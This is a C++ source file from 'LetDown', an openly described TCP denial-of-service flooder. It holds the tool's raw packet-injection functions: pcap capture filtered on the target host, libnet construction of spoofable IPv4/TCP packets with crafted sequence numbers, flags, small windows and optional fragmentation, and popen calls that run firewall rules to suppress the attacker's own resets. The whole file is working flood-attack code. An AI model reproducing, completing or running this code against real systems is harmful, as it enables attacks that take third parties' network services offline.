/*
 * INJECT.CPP
 * Packet injection functions...
 *
 * LetDown, tcp dos flooder. Raw 3 way handshake...
 * See http://insecure.org/stf/tcp-dos-attack-explained.html
 *
 * Copyright (C) 2009  Acri Emanuele <crossbower@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "inject.h"

/*
 * Enable firewall rule
 */
void firewall_on()
{
    FILE *p;

    if(progopt.firewall_set()) {
        p = popen(progopt.firewall[0], "r");
        pclose(p);
    }
}

/*
 * Disable firewall rule
 */
void firewall_off()
{
    FILE *p;

    if(progopt.firewall_set()) {
        p = popen(progopt.firewall[1], "r");
        pclose(p);
    }
}

/*
 * Calc the key for smap (tcp session map)
 */
inline sess_key calc_key(u_int32_t sip, u_int32_t dip, u_int16_t sport, u_int16_t dport)
{
    sess_key keyhash = 0;

    keyhash = sip ^ dip;
    keyhash = keyhash ^ (sport << 15) ^ dport;

    return keyhash;
}

/*
 * Initialize new session
 */
void init_new_session(u_int32_t sip, u_int32_t dip, u_int16_t sport, u_int16_t dport)
{
    struct tcp_session tcpsess;
    sess_key keyhash;

    memset(&tcpsess, 0, sizeof(tcpsess));

    // calc key for sess_map
    keyhash = calc_key(sip, dip, sport, dport);

    // fill session struct
    sess_map[keyhash].ip_src = sip;
    sess_map[keyhash].ip_dst = dip;
    sess_map[keyhash].tcp_sport = sport;
    sess_map[keyhash].tcp_dport = dport;
    sess_map[keyhash].active = 1;
}

/*
 * PCap initialize
 */
int pcap_initialize(char *pcap_errbuf, u_int32_t *net, u_int32_t *mask)
{
    char *dev;

    // find a device if not specified
    if(!progopt.device_set()) {
        dev = pcap_lookupdev(pcap_errbuf);
        if (dev == NULL) {
            return 0;
        }
    }
    else {
        dev = progopt.device;
    }

    // get network number and mask associated with capture device
    if(pcap_lookupnet(dev, net, mask, pcap_errbuf) == -1) {
        return 0;
    }

    // open capture device
    handle = pcap_open_live(dev, PKT_LEN, 1, progopt.time, pcap_errbuf);
    if (handle == NULL) {
        return 0;
    }

    return 1;
}

/*
 * PCap install filter
 */
int pcap_install_filter(char *pcap_errbuf, u_int32_t *net, u_int32_t *mask)
{
    char filter_exp[MAX_ARG];

    // prepare the filter expression
    if(!progopt.srcaddr_set()) {
        sprintf(filter_exp,
                "tcp and src host %s and src port %d",
                progopt.dstaddr, progopt.dport);
    }
    else {
        sprintf(filter_exp,
                "tcp and src host %s and src port %d and dst host %s",
                progopt.dstaddr, progopt.dport, progopt.srcaddr);
    }

    // compile the filter expression
    if (pcap_compile(handle, &fp, filter_exp, 0, *net) == -1) {
        strncpy(pcap_errbuf, pcap_geterr(handle), PCAP_ERRBUF_SIZE);
        return 0;
    }

    // apply the compiled filter
    if (pcap_setfilter(handle, &fp) == -1) {
        strncpy(pcap_errbuf, pcap_geterr(handle), PCAP_ERRBUF_SIZE);
        return 0;
    }

    return 1;
}

/*
 * Libnet initialize
 */
int libnet_initialize(char *lnet_errbuf, u_int32_t *src_ip, u_int32_t *dst_ip)
{
    // libnet init
    l = libnet_init(LIBNET_RAW4, progopt.device_set() ? progopt.device : NULL, lnet_errbuf);
    if ( l == NULL ) {
        return 0;
    }

    // check destination ip
    *dst_ip = libnet_name2addr4(l, progopt.dstaddr, LIBNET_DONT_RESOLVE);
    if(*dst_ip<1) {
        strncpy(lnet_errbuf, "Destination address error.\n", LIBNET_ERRBUF_SIZE);
        return 0;
    }

    // check source ip
    if(progopt.srcaddr_set()) {
        *src_ip = libnet_name2addr4(l, progopt.srcaddr, LIBNET_DONT_RESOLVE);
        if(*src_ip<1) {
            strncpy(lnet_errbuf, "Source address error.\n", LIBNET_ERRBUF_SIZE);
            return 0;
        }
    }
    else {
        *src_ip = libnet_get_ipaddr4(l);
        if(*src_ip<1) {
            strncpy(lnet_errbuf, libnet_geterror(l), LIBNET_ERRBUF_SIZE);
            return 0;
        }
    }

    return 1;
}

/*
 * Resend last packet
 */
int resend_last()
{
    // packet injection
    return libnet_write(l);
}

/*
 * Prepare IPv4 packet
 */
void prep_ipv4(u_int32_t src_ip, u_int32_t dst_ip)
{
    // build ip
    libnet_build_ipv4 (
        LIBNET_IPV4_H + LIBNET_TCP_H, /* size of the packet */
        IPTOS_LOWDELAY,               /* IP tos */
        ipid++,                       /* IP ID */
        0,                            /* frag stuff */
        128,                          /* TTL */
        IPPROTO_TCP,                  /* transport protocol */
        0,                            /* checksum */
        src_ip,                       /* source IP */
        dst_ip,                       /* destination IP */
        NULL,                         /* payload */
        0,                            /* payload length */
        l,                            /* libnet context */
        0                             /* build new header */
    );
}

/*
 * Prepare IPv4 packet + payload (+ fragmentation)
 */
void prep_ipv4(u_int32_t src_ip, u_int32_t dst_ip, int size, int frag=0)
{
    // build ip
    libnet_build_ipv4 (
        LIBNET_IPV4_H +
        LIBNET_TCP_H + size,  /* size of the packet */
        IPTOS_LOWDELAY,       /* IP tos */
        ipid++,               /* IP ID */
        frag/8,               /* frag stuff */
        128,                  /* TTL */
        IPPROTO_TCP,          /* transport protocol */
        0,                    /* checksum */
        src_ip,               /* source IP */
        dst_ip,               /* destination IP */
        NULL,                 /* payload */
        0,                    /* payload length */
        l,                    /* libnet context */
        0                     /* build new header */
    );
}

/*
 * Inject TCP packet without using session map
 */
int inject_tcp_packet(u_int32_t src, u_int32_t dst, u_int16_t sport, u_int16_t dport, u_int32_t seq, u_int32_t ack, u_int8_t flags, u_int16_t window)
{
    // clear
    libnet_clear_packet(l);

    // build tcp
    libnet_build_tcp(
        sport,           /* source TCP port */
        dport,           /* destination TCP port */
        seq,             /* sequence number */
        ack,             /* acknowledgement number */
        flags,           /* control flags */
        window,          /* window size */
        0,               /* checksum */
        0,               /* urgent pointer */
        LIBNET_TCP_H,    /* total length */
        NULL,            /* payload */
        0,               /* payload length */
        l,               /* libnet context */
        0                /* build new header */
    );

    // prepare ip packet
    prep_ipv4(src, dst);

    // packet injection
    return libnet_write(l);
}

/*
 * Inject 'normal' TCP packet
 */
int inject_tcp_packet(sess_key keyhash, u_int8_t flags, u_int16_t window)
{
    // clear
    libnet_clear_packet(l);

    // build tcp
    libnet_build_tcp(
        sess_map[keyhash].tcp_sport,  /* source TCP port */
        sess_map[keyhash].tcp_dport,  /* destination TCP port */
        sess_map[keyhash].tcp_seq,    /* sequence number */
        sess_map[keyhash].tcp_ack,    /* acknowledgement number */
        flags,                        /* control flags */
        window,                       /* window size */
        0,                            /* checksum */
        0,                            /* urgent pointer */
        LIBNET_TCP_H,                 /* total length */
        NULL,                         /* payload */
        0,                            /* payload length */
        l,                            /* libnet context */
        0                             /* build new header */
    );

    // prepare ip packet
    prep_ipv4(sess_map[keyhash].ip_src, sess_map[keyhash].ip_dst);

    // packet injection
    return libnet_write(l);
}

/*
 * Inject TCP packet with payload
 */
int inject_tcp_packet(sess_key keyhash, char *payload, u_int8_t flags, u_int16_t window)
{

    // clear
    libnet_clear_packet(l);

    // build tcp
    libnet_build_tcp(
        sess_map[keyhash].tcp_sport,  /* source TCP port */
        sess_map[keyhash].tcp_dport,  /* destination TCP port */
        sess_map[keyhash].tcp_seq,    /* sequence number */
        sess_map[keyhash].tcp_ack,    /* acknowledgement number */
        flags,                        /* control flags */
        window,                       /* window size */
        0,                            /* checksum */
        0,                            /* urgent pointer */
        LIBNET_TCP_H +
        (payload[0]!='\0' ? strlen(payload) : 0),             /* total length */
        (payload[0]!='\0' ? (unsigned char *)payload : NULL), /* payload */
        (payload[0]!='\0' ? strlen(payload) : 0),             /* payload length */
        l,                            /* libnet context */
        0                             /* build new header */
    );

    // prepare ip packet
    if(payload[0]!='\0') {

        // fragmentation
        if(progopt.frag) {
            prep_ipv4(sess_map[keyhash].ip_src, sess_map[keyhash].ip_dst, strlen(payload), progopt.frag);
        }
        else {
            prep_ipv4(sess_map[keyhash].ip_src, sess_map[keyhash].ip_dst, strlen(payload));
        }

    } else {
        prep_ipv4(sess_map[keyhash].ip_src, sess_map[keyhash].ip_dst);
    }

    // packet injection
    return libnet_write(l);
}
